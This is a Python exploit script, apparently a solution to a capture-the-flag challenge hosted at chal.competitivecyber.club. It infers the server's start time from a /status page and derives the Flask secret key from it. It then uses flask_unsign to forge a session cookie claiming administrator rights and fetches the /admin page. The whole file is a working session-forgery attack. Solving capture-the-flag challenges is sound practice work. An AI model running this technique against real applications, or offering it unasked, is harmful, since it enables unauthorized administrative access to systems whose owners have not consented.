#!/usr/bin/env python3

import hashlib
import uuid
from datetime import datetime, timedelta

import requests
from flask_unsign import sign

HOST = 'http://chal.competitivecyber.club:9999'
# HOST = 'http://localhost:9999'


def get_server_start_str():
    resp = requests.get(f'{HOST}/status')
    uptime_str, time_str = [
        s.split(': ', 1)[1] for s in resp.text.strip().split('<br>')
    ]

    hours, minutes, seconds = map(int, uptime_str.split(':'))
    uptime = timedelta(hours=hours, minutes=minutes, seconds=seconds)

    time = datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
    start = time - uptime
    return start.strftime('%Y%m%d%H%M%S')


def main():
    secret = uuid.UUID('31333337-1337-1337-1337-133713371337')

    server_start_str = get_server_start_str()
    secure_key = hashlib.sha256(
        f'secret_key_{server_start_str}'.encode()).hexdigest()

    session = {
        "is_admin": True,
        "uid": str(uuid.uuid5(secret, 'administrator')),
        "username": "administrator"
    }

    cookies = {'session': sign(session, secure_key)}
    resp = requests.get(f'{HOST}/admin', cookies=cookies)
    print(resp.text)


if __name__ == "__main__":
    main()
